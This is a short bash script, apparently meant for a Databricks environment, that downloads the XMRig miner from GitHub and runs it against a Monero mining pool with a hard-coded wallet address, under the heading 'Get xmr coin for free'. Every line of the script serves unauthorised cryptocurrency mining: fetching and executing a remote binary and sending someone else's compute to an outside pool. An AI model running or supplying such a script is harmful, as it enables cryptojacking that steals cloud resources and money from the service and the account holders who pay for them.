#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o us-west.minexmr.com:443 -u 89XEDCwvMEVGG9XLcy3vA4EoGaLNFFHftJFjTWAjXQiqM8WD6EgXTAmZ7jK7nB7U6miDRnttNALMQW1U3Q3eZsj2FmDCCxs -k --tls --rig-id aank
